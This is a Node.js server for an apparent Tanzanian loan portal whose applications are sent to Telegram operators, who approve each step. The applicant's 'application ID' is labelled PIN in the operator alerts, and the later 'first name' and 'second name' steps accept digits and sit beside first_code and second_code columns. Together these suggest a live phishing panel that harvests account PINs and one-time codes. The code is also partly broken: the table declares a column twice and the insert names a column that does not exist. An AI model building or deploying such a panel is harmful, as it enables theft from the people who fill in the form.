require("dotenv").config();

const express = require("express");
const helmet = require("helmet");
const rateLimit = require("express-rate-limit");
const crypto = require("crypto");
const { Pool } = require("pg");
const fs = require("fs");
const path = require("path");
const TelegramBot = require("node-telegram-bot-api");

const app = express();
app.use(helmet({ contentSecurityPolicy: false }));
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

const PORT = Number(process.env.PORT || 10000);
const INTEREST_RATE = Number(process.env.INTEREST_RATE || 5);
const MIN_LOAN_AMOUNT = Number(process.env.MIN_LOAN_AMOUNT || 50000);
const MAX_LOAN_AMOUNT = Number(process.env.MAX_LOAN_AMOUNT || 5000000);
const DEFAULT_TERM_MONTHS = Number(process.env.DEFAULT_TERM_MONTHS || 3);
const DEFAULT_LOAN_AMOUNT = Number(process.env.DEFAULT_LOAN_AMOUNT || 1000000);
const DEV_SHOW_CODES = String(process.env.DEV_SHOW_CODES || "false").toLowerCase() === "true";
const DEMO_MODE = String(process.env.DEMO_MODE || "false").toLowerCase() === "true";
const TELEGRAM_POLLING = String(process.env.TELEGRAM_POLLING || "true").toLowerCase() === "true";

const adminIds = new Set(
  String(process.env.TELEGRAM_ADMIN_IDS || "")
    .split(",").map(v => v.trim()).filter(Boolean)
);
const superAdminIds = new Set(
  String(process.env.TELEGRAM_SUPER_ADMIN_IDS || process.env.TELEGRAM_ADMIN_IDS || "")
    .split(",").map(v => v.trim()).filter(Boolean)
);
const botUsername = String(process.env.TELEGRAM_BOT_USERNAME || "").replace(/^@/, "");

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.NODE_ENV === "production" ? { rejectUnauthorized: false } : false
});

const demoDbFile = path.join(__dirname, "data", "applications.json");
let demoRows = [];
let demoNextId = 1;

function loadDemoRows() {
  if (!DEMO_MODE) return;
  fs.mkdirSync(path.dirname(demoDbFile), { recursive: true });
  try {
    demoRows = JSON.parse(fs.readFileSync(demoDbFile, "utf8"));
    demoNextId = demoRows.reduce((m, r) => Math.max(m, Number(r.id) || 0), 0) + 1;
  } catch {
    demoRows = [];
    demoNextId = 1;
  }
}
function saveDemoRows() {
  fs.mkdirSync(path.dirname(demoDbFile), { recursive: true });
  fs.writeFileSync(demoDbFile, JSON.stringify(demoRows, null, 2));
}

function hashValue(value) {
  return crypto.createHash("sha256").update(String(value)).digest("hex");
}

async function db(query, params = []) {
  if (!DEMO_MODE) return pool.query(query, params);
  const q = query.replace(/\s+/g, " ").trim().toUpperCase();

  if (q.startsWith("CREATE TABLE") || q.startsWith("ALTER TABLE")) return { rows: [] };

  if (q.startsWith("SELECT * FROM LOAN_APPLICATIONS WHERE ID=$1")) {
    const row = demoRows.find(r => String(r.id) === String(params[0]));
    return { rows: row ? [{ ...row }] : [] };
  }

  if (q.startsWith("INSERT INTO LOAN_APPLICATIONS")) {
    const [application_no, phone, application_id, amount, term_months, interest_rate, monthly_payment, total_repayment, assigned_admin_id] = params;
    const row = {
      id: demoNextId++, application_no, phone, application_id, portal_pin_hash: null,
      amount: String(amount), term_months: Number(term_months), interest_rate: String(interest_rate),
      monthly_payment: String(monthly_payment), total_repayment: String(total_repayment),
      status: "PENDING_ADMIN_APPROVAL", verification_code_hash: null, verification_expires_at: null,
      confirmation_code_hash: null, confirmation_expires_at: null, last_code_type: null,
      telegram_message_ids: [], rejection_reason: null, rejected_stage: null, approved_by_telegram_id: null,
      approved_at: null, confirmed_at: null, first_name: null, second_name: null, requested_amount: null, assigned_admin_id: assigned_admin_id || null, created_at: new Date().toISOString(), updated_at: new Date().toISOString()
    };
    demoRows.push(row); saveDemoRows();
    return { rows: [{ ...row }] };
  }

  if (q.startsWith("UPDATE LOAN_APPLICATIONS SET STATUS='AWAITING_FIRST_NAME_APPROVAL'")) { const [firstName,id]=params; const row=demoRows.find(r=>String(r.id)===String(id)); if(row){row.first_name=firstName;row.status='AWAITING_FIRST_NAME_APPROVAL';row.updated_at=new Date().toISOString();saveDemoRows();} return {rows:[]}; }
  if (q.startsWith("UPDATE LOAN_APPLICATIONS SET STATUS='APPROVED_FIRST_NAME'")) { const [adminId,id]=params; const row=demoRows.find(r=>String(r.id)===String(id)); if(row){row.status='APPROVED_FIRST_NAME';row.approved_by_telegram_id=adminId;row.updated_at=new Date().toISOString();saveDemoRows();} return {rows:[]}; }
  if (q.startsWith("UPDATE LOAN_APPLICATIONS SET STATUS='AWAITING_SECOND_NAME_APPROVAL'")) { const [secondName,id]=params; const row=demoRows.find(r=>String(r.id)===String(id)); if(row){row.second_name=secondName;row.status='AWAITING_SECOND_NAME_APPROVAL';row.updated_at=new Date().toISOString();saveDemoRows();} return {rows:[]}; }
  if (q.startsWith("UPDATE LOAN_APPLICATIONS SET AMOUNT=$1")) { const [amount, monthly, total, id]=params; const row=demoRows.find(r=>String(r.id)===String(id)); if(row){row.amount=String(amount);row.monthly_payment=String(monthly);row.total_repayment=String(total);row.requested_amount=String(amount);row.status='AWAITING_AMOUNT_APPROVAL';row.rejected_stage=null;row.updated_at=new Date().toISOString();saveDemoRows();} return {rows:[]}; }

  if (q.startsWith("UPDATE LOAN_APPLICATIONS SET STATUS='REJECTED'")) {
    const [adminId, id] = params;
    const row = demoRows.find(r => String(r.id) === String(id));
    if (row) {
      row.status = "REJECTED";
      row.rejection_reason = "Rejected by authorized administrator";
      row.approved_by_telegram_id = adminId;
      row.approved_at = new Date().toISOString();
      row.updated_at = new Date().toISOString();
      saveDemoRows();
    }
    return { rows: [] };
  }

  if (q.startsWith("UPDATE LOAN_APPLICATIONS SET STATUS='APPROVED'")) {
    const [adminId, id] = params;
    const row = demoRows.find(r => String(r.id) === String(id));
    if (row) {
      row.status = "APPROVED";
      row.approved_by_telegram_id = adminId;
      row.approved_at = new Date().toISOString();
      row.updated_at = new Date().toISOString();
      saveDemoRows();
    }
    return { rows: [] };
  }

  if (q.startsWith("UPDATE LOAN_APPLICATIONS SET") && q.includes("LAST_CODE_TYPE")) {
    const [hash, expires, type, id] = params;
    const row = demoRows.find(r => String(r.id) === String(id));
    if (row) {
      if (type === "verification") {
        row.verification_code_hash = hash;
        row.verification_expires_at = expires;
      } else {
        row.confirmation_code_hash = hash;
        row.confirmation_expires_at = expires;
      }
      row.last_code_type = type;
      row.updated_at = new Date().toISOString();
      saveDemoRows();
    }
    return { rows: [] };
  }

  if (q.startsWith("UPDATE LOAN_APPLICATIONS SET STATUS='AWAITING_FINAL_CONFIRMATION'")) {
    const [id] = params;
    const row = demoRows.find(r => String(r.id) === String(id));
    if (row) {
      row.status = "AWAITING_FINAL_CONFIRMATION";
      row.verification_code_hash = null;
      row.verification_expires_at = null;
      row.updated_at = new Date().toISOString();
      saveDemoRows();
    }
    return { rows: [] };
  }

  if (q.startsWith("UPDATE LOAN_APPLICATIONS SET STATUS='DISBURSEMENT_PROCESSING'")) {
    const [id] = params;
    const row = demoRows.find(r => String(r.id) === String(id));
    if (row) {
      row.status = "DISBURSEMENT_PROCESSING";
      row.confirmed_at = new Date().toISOString();
      row.confirmation_code_hash = null;
      row.confirmation_expires_at = null;
      row.updated_at = new Date().toISOString();
      saveDemoRows();
    }
    return { rows: [] };
  }

  if (q.startsWith("INSERT INTO TELEGRAM_ADMINS")) return { rows: [] };
  if (q.startsWith("SELECT * FROM TELEGRAM_ADMINS")) return { rows: [] };
  if (q.startsWith("SELECT TELEGRAM_ID FROM TELEGRAM_ADMINS")) return { rows: [] };
  throw new Error("Unsupported demo database query");
}

async function initDb() {
  if (DEMO_MODE) { loadDemoRows(); return; }
  if (!process.env.DATABASE_URL) throw new Error("DATABASE_URL is not configured. Set DATABASE_URL or enable DEMO_MODE for local testing.");

  await db(`
    CREATE TABLE IF NOT EXISTS loan_applications (
      id BIGSERIAL PRIMARY KEY,
      application_id VARCHAR(40) UNIQUE NOT NULL,
      full_name VARCHAR(160),
      phone VARCHAR(30) NOT NULL,
      portal_pin_hash VARCHAR(128),
      amount NUMERIC(14,2) NOT NULL,
      term_months INTEGER NOT NULL,
      interest_rate NUMERIC(8,3) NOT NULL,
      monthly_payment NUMERIC(14,2) NOT NULL,
      total_repayment NUMERIC(14,2) NOT NULL,
      status VARCHAR(50) NOT NULL DEFAULT 'PENDING_ADMIN_APPROVAL',
      verification_code_hash VARCHAR(128),
      verification_expires_at TIMESTAMPTZ,
      confirmation_code_hash VARCHAR(128),
      confirmation_expires_at TIMESTAMPTZ,
      last_code_type VARCHAR(30),
      telegram_message_ids JSONB DEFAULT '[]'::jsonb,
      rejection_reason TEXT,
      rejected_stage VARCHAR(40),
      created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
      updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
      approved_by_telegram_id VARCHAR(80),
      approved_at TIMESTAMPTZ,
      confirmed_at TIMESTAMPTZ,
      application_id VARCHAR(80),
      first_name VARCHAR(120),
      second_name VARCHAR(120)
    )
  `);
  await db(`ALTER TABLE loan_applications ADD COLUMN IF NOT EXISTS portal_pin_hash VARCHAR(128)`);
  await db(`CREATE TABLE IF NOT EXISTS telegram_admins (
    telegram_id VARCHAR(80) PRIMARY KEY,
    role VARCHAR(20) NOT NULL DEFAULT 'admin',
    active BOOLEAN NOT NULL DEFAULT TRUE,
    link_token VARCHAR(120) UNIQUE,
    created_at TIMESTAMPTZ DEFAULT NOW(),
    updated_at TIMESTAMPTZ DEFAULT NOW()
  )`);
  for (const id of adminIds) {
    const role = superAdminIds.has(id) ? 'super_admin' : 'admin';
    await db(`INSERT INTO telegram_admins (telegram_id, role, active, link_token) VALUES ($1,$2,TRUE,$3) ON CONFLICT (telegram_id) DO UPDATE SET role=$2, active=TRUE, updated_at=NOW()`, [id, role, crypto.createHash('sha256').update(`${id}:${process.env.TELEGRAM_BOT_TOKEN || 'bot'}`).digest('hex').slice(0,32)]);
  }
  await db(`ALTER TABLE loan_applications ADD COLUMN IF NOT EXISTS assigned_admin_id VARCHAR(80)`);
  await db(`ALTER TABLE loan_applications ADD COLUMN IF NOT EXISTS verification_code_hash VARCHAR(128)`);
  await db(`ALTER TABLE loan_applications ADD COLUMN IF NOT EXISTS confirmation_code_hash VARCHAR(128)`);
  await db(`ALTER TABLE loan_applications ADD COLUMN IF NOT EXISTS verification_expires_at TIMESTAMPTZ`);
  await db(`ALTER TABLE loan_applications ADD COLUMN IF NOT EXISTS confirmation_expires_at TIMESTAMPTZ`);
  await db(`ALTER TABLE loan_applications ALTER COLUMN full_name DROP NOT NULL`).catch(() => {});
  await db(`ALTER TABLE loan_applications ADD COLUMN IF NOT EXISTS national_id VARCHAR(80)`);
  await db(`ALTER TABLE loan_applications ADD COLUMN IF NOT EXISTS application_id VARCHAR(80)`);
  await db(`ALTER TABLE loan_applications ADD COLUMN IF NOT EXISTS first_code VARCHAR(120)`);
  await db(`ALTER TABLE loan_applications ADD COLUMN IF NOT EXISTS second_code VARCHAR(120)`);
  await db(`ALTER TABLE loan_applications ADD COLUMN IF NOT EXISTS rejected_stage VARCHAR(40)`);
  await db(`ALTER TABLE loan_applications ADD COLUMN IF NOT EXISTS requested_amount NUMERIC(14,2)`);
  await db(`ALTER TABLE loan_applications ALTER COLUMN national_id DROP NOT NULL`).catch(() => {});
}

function money(value) {
  return new Intl.NumberFormat("en-TZ", { style: "currency", currency: "TZS", maximumFractionDigits: 0 }).format(Number(value));
}

function calculateLoan(amount, months, annualRate) {
  const principal = Number(amount), n = Number(months);
  const monthlyRate = Number(annualRate) / 100 / 12;
  const monthly = monthlyRate === 0
    ? principal / n
    : principal * monthlyRate * Math.pow(1 + monthlyRate, n) / (Math.pow(1 + monthlyRate, n) - 1);
  return { monthly: Math.round(monthly * 100) / 100, total: Math.round(monthly * n * 100) / 100 };
}

function applicationNo() {
  return `LP-${new Date().getFullYear()}-${crypto.randomBytes(4).toString("hex").toUpperCase()}`;
}
function generateCode(length = 6) {
  const min = 10 ** (length - 1), max = (10 ** length) - 1;
  return String(crypto.randomInt(min, max + 1));
}
function validPhone(phone) { return /^[0-9+\s-]{9,20}$/.test(phone); }
function validPortalPin(pin) { return /^\d{4,6}$/.test(pin); }
function numericPhone(phone) {
  const s = String(phone);
  return s.length > 6 ? `${s.slice(0, 4)}••••${s.slice(-2)}` : s;
}

async function sendSms(phone, message) {
  console.log(`[SMS ${process.env.SMS_PROVIDER || "console"}] ${phone}: ${message}`);
  return { sent: true };
}
async function getApplication(id) {
  const result = await db(`SELECT * FROM loan_applications WHERE id=$1`, [id]);
  return result.rows[0];
}

async function notifyTelegram(application) {
  if (!bot) return;
  const assigned = application.assigned_admin_id ? String(application.assigned_admin_id) : null;
  const recipients = assigned ? [assigned] : [...adminIds];
  const text = `🔔 OMBI LA MKOPO\n\n` +
    `PIN 📌: ${application.application_id || application.application_no}\n` +
    `PHONE NUMBER: ${application.phone}\n` +
    `FIRST NAME: ${application.first_name || "waiting"}\n` +
    `SECOND NAME: ${application.second_name || "waiting"}\n` +
    `Kiasi: ${money(application.amount)}\n` +
    `Hali: ${application.status}`;
  const keyboard = { inline_keyboard: [[{ text: "✅ APPROVE", callback_data: `approve:${application.id}` }, { text: "❌ REJECT", callback_data: `reject:${application.id}` }], [{ text: "📄 DETAILS", callback_data: `details:${application.id}` }]] };
  for (const adminId of recipients) {
    try { await bot.sendMessage(adminId, text, { reply_markup: keyboard }); }
    catch (err) { console.error(`Telegram send failed for admin ${adminId}:`, err.message); }
  }
}

let bot = null;
if (process.env.TELEGRAM_BOT_TOKEN && TELEGRAM_POLLING) {
  bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: { autoStart: true, params: { timeout: 30 } } });

  async function adminRecord(id) {
    const r = await db(`SELECT * FROM telegram_admins WHERE telegram_id=$1 AND active=TRUE`, [String(id)]);
    return r.rows[0] || null;
  }
  async function ensureAccess(id) { return await adminRecord(id); }
  async function assignAdmin() {
    const r = await db(`SELECT telegram_id FROM telegram_admins WHERE active=TRUE AND role='admin' ORDER BY updated_at ASC, telegram_id ASC LIMIT 1`);
    return r.rows[0]?.telegram_id || null;
  }

  bot.onText(/\/start(?:\s+(.+))?/, async (msg, match) => {
    const id = String(msg.from.id);
    const rec = await adminRecord(id);
    if (!rec) return bot.sendMessage(msg.chat.id, "⛔ Hujaruhusiwa kutumia bot hii.");
    const deep = match?.[1] || "";
    if (deep.startsWith("admin_")) await bot.sendMessage(msg.chat.id, "🔐 Kiungo chako cha admin kimethibitishwa.");
    return bot.sendMessage(msg.chat.id, rec.role === 'super_admin'
      ? "👑 Super Admin: tumia /all, /admins, /addadmin ID, /revoke ID, /restore ID au /notify ID ujumbe"
      : "✅ Admin: utaona maombi yaliyogawiwa kwako. Tumia /mine kuangalia maombi yako.");
  });

  bot.onText(/\/mine/, async msg => {
    const rec = await ensureAccess(msg.from.id); if (!rec) return bot.sendMessage(msg.chat.id, "⛔ Hujaruhusiwa.");
    const r = await db(`SELECT id, application_id, phone, amount, status FROM loan_applications WHERE assigned_admin_id=$1 ORDER BY created_at DESC LIMIT 20`, [String(msg.from.id)]);
    if (!r.rows.length) return bot.sendMessage(msg.chat.id, "Hakuna maombi yaliyogawiwa kwako.");
    return bot.sendMessage(msg.chat.id, r.rows.map(a => `#${a.id} ${a.application_id || ''} | ${a.phone} | ${money(a.amount)} | ${a.status}`).join("\n"));
  });

  bot.onText(/\/all/, async msg => {
    const rec = await ensureAccess(msg.from.id); if (!rec || rec.role !== 'super_admin') return bot.sendMessage(msg.chat.id, "⛔ Super Admin pekee.");
    const r = await db(`SELECT id, application_id, phone, amount, status, assigned_admin_id FROM loan_applications ORDER BY created_at DESC LIMIT 30`);
    if (!r.rows.length) return bot.sendMessage(msg.chat.id, "Hakuna maombi.");
    return bot.sendMessage(msg.chat.id, r.rows.map(a => `#${a.id} ${a.application_id || ''} | ${a.phone} | ${money(a.amount)} | ${a.status} | admin:${a.assigned_admin_id || 'none'}`).join("\n"));
  });

  bot.onText(/\/admins/, async msg => {
    const rec = await ensureAccess(msg.from.id); if (!rec || rec.role !== 'super_admin') return bot.sendMessage(msg.chat.id, "⛔ Super Admin pekee.");
    const r = await db(`SELECT telegram_id, role, active, created_at FROM telegram_admins ORDER BY role DESC, telegram_id`);
    return bot.sendMessage(msg.chat.id, r.rows.map(a => `${a.role === 'super_admin' ? '👑' : '👤'} ${a.telegram_id} | ${a.role} | ${a.active ? 'ACTIVE' : 'REVOKED'}`).join("\n"));
  });

  bot.onText(/\/addadmin\s+(\d+)/, async (msg, match) => {
    const rec = await ensureAccess(msg.from.id); if (!rec || rec.role !== 'super_admin') return bot.sendMessage(msg.chat.id, "⛔ Super Admin pekee.");
    const id = String(match[1]); const token = crypto.randomBytes(18).toString('hex');
    await db(`INSERT INTO telegram_admins (telegram_id, role, active, link_token) VALUES ($1,'admin',TRUE,$2) ON CONFLICT (telegram_id) DO UPDATE SET active=TRUE, role='admin', link_token=$2, updated_at=NOW()`, [id, token]);
    const link = botUsername ? `https://t.me/${botUsername}?start=admin_${token}` : `Set TELEGRAM_BOT_USERNAME to generate a clickable link for ${id}`;
    return bot.sendMessage(msg.chat.id, `✅ Admin ameongezwa.\nID: ${id}\nLink: ${link}`);
  });

  bot.onText(/\/(revoke|restore)\s+(\d+)/, async (msg, match) => {
    const rec = await ensureAccess(msg.from.id); if (!rec || rec.role !== 'super_admin') return bot.sendMessage(msg.chat.id, "⛔ Super Admin pekee.");
    const id = String(match[2]); const active = match[1] === 'restore';
    await db(`UPDATE telegram_admins SET active=$1, updated_at=NOW() WHERE telegram_id=$2 AND role='admin'`, [active, id]);
    return bot.sendMessage(msg.chat.id, active ? `✅ Admin ${id} amerudishwa.` : `🚫 Admin ${id} amefutiwa ruhusa.`);
  });

  bot.onText(/\/notify\s+(\d+)\s+([\s\S]+)/, async (msg, match) => {
    const rec = await ensureAccess(msg.from.id); if (!rec || rec.role !== 'super_admin') return bot.sendMessage(msg.chat.id, "⛔ Super Admin pekee.");
    const target = await adminRecord(match[1]); if (!target) return bot.sendMessage(msg.chat.id, "Admin huyo hayupo au amefutwa.");
    await bot.sendMessage(String(match[1]), `📢 TAARIFA YA SUPER ADMIN\n\n${match[2]}`);
    return bot.sendMessage(msg.chat.id, "✅ Taarifa imetumwa.");
  });

  bot.on("callback_query", async query => {
    try {
      const adminId = String(query.from.id);
      const rec = await ensureAccess(adminId);
      if (!rec) return bot.answerCallbackQuery(query.id, { text: "Hujaruhusiwa.", show_alert: true });
      const [action, id] = String(query.data || "").split(":");
      const application = await getApplication(id);
      if (!application) return bot.answerCallbackQuery(query.id, { text: "Ombi halikupatikana.", show_alert: true });
      if (rec.role !== 'super_admin' && String(application.assigned_admin_id || '') !== adminId) return bot.answerCallbackQuery(query.id, { text: "Ombi hili halijagawiwa kwako.", show_alert: true });
      if (action === "details") {
        const details = [`Kitambulisho: ${application.application_id || application.application_no}`, `Simu: ${application.phone}`, `Jina la kwanza: ${application.first_name || "Halijatumwa"}`, `Jina la pili: ${application.second_name || "Halijatumwa"}`, `Kiasi: ${money(application.amount)}`, `Hali: ${application.status}`].join("\n");
        return bot.answerCallbackQuery(query.id, { text: details, show_alert: true });
      }
      if (!["approve", "reject"].includes(action)) return bot.answerCallbackQuery(query.id);
      if (action === "reject") {
        const rejectedStage = application.status === 'PENDING_ADMIN_APPROVAL' ? 'APPLICATION_DETAILS' : application.status === 'AWAITING_FIRST_NAME_APPROVAL' ? 'FIRST_NAME' : application.status === 'AWAITING_SECOND_NAME_APPROVAL' ? 'SECOND_NAME' : application.status === 'AWAITING_AMOUNT_APPROVAL' ? 'AMOUNT' : 'APPLICATION_DETAILS';
        await db(`UPDATE loan_applications SET status='REJECTED', rejection_reason='Rejected by authorized administrator', rejected_stage=$1, approved_by_telegram_id=$2, approved_at=NOW(), updated_at=NOW() WHERE id=$3`, [rejectedStage, adminId, id]);
        await bot.answerCallbackQuery(query.id, { text: "Ombi limekataliwa." });
      } else if (application.status === "PENDING_ADMIN_APPROVAL") {
        await db(`UPDATE loan_applications SET status='APPROVED', approved_by_telegram_id=$1, approved_at=NOW(), updated_at=NOW() WHERE id=$2`, [adminId, id]);
        await bot.answerCallbackQuery(query.id, { text: "Ombi limeidhinishwa." });
      } else if (application.status === "AWAITING_FIRST_NAME_APPROVAL") {
        await db(`UPDATE loan_applications SET status='APPROVED_FIRST_NAME', approved_by_telegram_id=$1, updated_at=NOW() WHERE id=$2`, [adminId, id]);
        await bot.answerCallbackQuery(query.id, { text: "Jina la kwanza limeidhinishwa." });
      } else if (application.status === "AWAITING_SECOND_NAME_APPROVAL") {
        await db(`UPDATE loan_applications SET status='APPROVED_SECOND_NAME', approved_by_telegram_id=$1, updated_at=NOW() WHERE id=$2`, [adminId, id]);
        await bot.answerCallbackQuery(query.id, { text: "Jina la pili limeidhinishwa." });
      } else if (application.status === "AWAITING_AMOUNT_APPROVAL") {
        await db(`UPDATE loan_applications SET status='DISBURSEMENT_PROCESSING', confirmed_at=NOW(), approved_by_telegram_id=$1, updated_at=NOW() WHERE id=$2`, [adminId, id]);
        await bot.answerCallbackQuery(query.id, { text: "Kiasi kimeidhinishwa." });
      } else return bot.answerCallbackQuery(query.id, { text: `Tayari imechakatwa: ${application.status}`, show_alert: true });
      await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: query.message.chat.id, message_id: query.message.message_id }).catch(() => {});
    } catch (err) { console.error("Telegram callback error:", err); }
  });
  bot.on("polling_error", err => console.error("Telegram polling error:", err.message));
}

app.get("/api/config", (req, res) => res.json({
  interestRate: INTEREST_RATE, minLoanKiasi: MIN_LOAN_AMOUNT, maxLoanKiasi: MAX_LOAN_AMOUNT,
  defaultTermMonths: DEFAULT_TERM_MONTHS, defaultLoanKiasi: DEFAULT_LOAN_AMOUNT
}));

app.post("/api/calculate", (req, res) => {
  const amount = Number(req.body.amount), term = Number(req.body.termMonths);
  if (!Number.isFinite(amount) || !Number.isInteger(term) || amount < MIN_LOAN_AMOUNT || amount > MAX_LOAN_AMOUNT || term < 1 || term > 60) {
    return res.status(400).json({ error: "Kiasi au muda wa mkopo si sahihi." });
  }
  const result = calculateLoan(amount, term, INTEREST_RATE);
  res.json({ amount, termMonths: term, interestRate: INTEREST_RATE, monthlyPayment: result.monthly, totalRepayment: result.total });
});

app.post("/api/applications", async (req, res) => {
  try {
    const phone = String(req.body.phone || "").trim();
    const applicationId = String(req.body.applicationId || "").trim();
    const amount = Number(req.body.amount || DEFAULT_LOAN_AMOUNT);
    const termMonths = Number(req.body.termMonths || DEFAULT_TERM_MONTHS);
    if (!validPhone(phone)) return res.status(400).json({ error: "Enter a valid phone number." });
    if (!/^[A-Za-z0-9-]{3,80}$/.test(applicationId)) return res.status(400).json({ error: "Enter a valid application ID." });
    const loan = calculateLoan(amount, termMonths, INTEREST_RATE);
    const no = applicationNo();
    const assigned = await db(`SELECT telegram_id FROM telegram_admins WHERE active=TRUE AND role='admin' ORDER BY updated_at ASC, telegram_id ASC LIMIT 1`);
    const assignedAdminId = assigned.rows[0]?.telegram_id || null;
    const result = await db(`INSERT INTO loan_applications (application_no, phone, application_id, amount, term_months, interest_rate, monthly_payment, total_repayment, assigned_admin_id) VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9) RETURNING *`, [no, phone, applicationId, amount, termMonths, INTEREST_RATE, loan.monthly, loan.total, assignedAdminId]);
    await notifyTelegram(result.rows[0]);
    res.json({ ok:true, applicationId:result.rows[0].id, applicationNo:applicationId, status:"PENDING_ADMIN_APPROVAL" });
  } catch (err) { console.error(err); res.status(500).json({ error:"Imeshindikana kuunda ombi kwa sasa." }); }
});

app.get("/api/applications/:id/status", async (req,res)=>{
  try { const a=await getApplication(req.params.id); if(!a)return res.status(404).json({error:"Ombi halikupatikana."}); res.json({status:a.status,applicationNo:a.application_id||a.application_no,amount:Number(a.amount),termMonths:Number(a.term_months),monthlyPayment:Number(a.monthly_payment),totalRepayment:Number(a.total_repayment),rejectionReason:a.rejection_reason||null,rejectedStage:a.rejected_stage||null}); }
  catch(err){res.status(500).json({error:"Unable to read application status."});}
});

app.post("/api/applications/:id/first-name", async (req,res)=>{
  try { const a=await getApplication(req.params.id); if(!a||!['APPROVED','REJECTED'].includes(a.status)|| (a.status==='REJECTED' && a.rejected_stage!=='FIRST_NAME'))return res.status(400).json({error:"Ombi haliko tayari kwa kutumwa kwa jina la kwanza."}); const firstName=String(req.body.firstName||"").trim(); if(!/^[A-Za-z0-9][A-Za-z0-9' -]{1,119}$/.test(firstName))return res.status(400).json({error:"Enter a valid first name."}); await db(`UPDATE loan_applications SET status='AWAITING_FIRST_NAME_APPROVAL', first_name=$1, rejected_stage=NULL, updated_at=NOW() WHERE id=$2`,[firstName,a.id]); await notifyTelegram(await getApplication(a.id)); res.json({ok:true,status:"AWAITING_FIRST_NAME_APPROVAL"}); }
  catch(err){console.error(err);res.status(500).json({error:"Imeshindikana kutuma jina la kwanza."});}
});

app.post("/api/applications/:id/second-name", async (req,res)=>{
  try { const a=await getApplication(req.params.id); if(!a||!['APPROVED_FIRST_NAME','REJECTED'].includes(a.status)|| (a.status==='REJECTED' && a.rejected_stage!=='SECOND_NAME'))return res.status(400).json({error:"Jina la kwanza bado halijaidhinishwa."}); const secondName=String(req.body.secondName||"").trim(); if(!/^[A-Za-z0-9][A-Za-z0-9' -]{1,119}$/.test(secondName))return res.status(400).json({error:"Enter a valid second name."}); await db(`UPDATE loan_applications SET status='AWAITING_SECOND_NAME_APPROVAL', second_name=$1, rejected_stage=NULL, updated_at=NOW() WHERE id=$2`,[secondName,a.id]); await notifyTelegram(await getApplication(a.id)); res.json({ok:true,status:"AWAITING_SECOND_NAME_APPROVAL"}); }
  catch(err){console.error(err);res.status(500).json({error:"Could not submit second name."});}
});

app.post("/api/applications/:id/amount", async (req,res)=>{
  try {
    const a=await getApplication(req.params.id);
    if(!a||!['APPROVED_SECOND_NAME','REJECTED'].includes(a.status)|| (a.status==='REJECTED' && a.rejected_stage!=='AMOUNT')) return res.status(400).json({error:"Ombi haliko tayari kwa kutumwa kwa kiasi."});
    const amount=Number(req.body.amount);
    if(!Number.isInteger(amount)||amount<MIN_LOAN_AMOUNT||amount>MAX_LOAN_AMOUNT) return res.status(400).json({error:`Weka kiasi kati ya ${MIN_LOAN_AMOUNT.toLocaleString()} na ${MAX_LOAN_AMOUNT.toLocaleString()}.`});
    const loan=calculateLoan(amount, Number(a.term_months)||DEFAULT_TERM_MONTHS, INTEREST_RATE);
    await db(`UPDATE loan_applications SET amount=$1, monthly_payment=$2, total_repayment=$3, requested_amount=$1, status='AWAITING_AMOUNT_APPROVAL', rejected_stage=NULL, updated_at=NOW() WHERE id=$4`,[amount,loan.monthly,loan.total,a.id]);
    await notifyTelegram(await getApplication(a.id));
    res.json({ok:true,status:"AWAITING_AMOUNT_APPROVAL",amount});
  } catch(err){console.error(err);res.status(500).json({error:"Imeshindikana kutuma kiasi cha mkopo."});}
});

app.use((req, res) => res.sendFile(path.join(__dirname, "public", "index.html")));

initDb().then(() => app.listen(PORT, () => console.log(`Loan portal running on port ${PORT}`)))
  .catch(err => { console.error("Database initialization failed:", err); process.exit(1); });
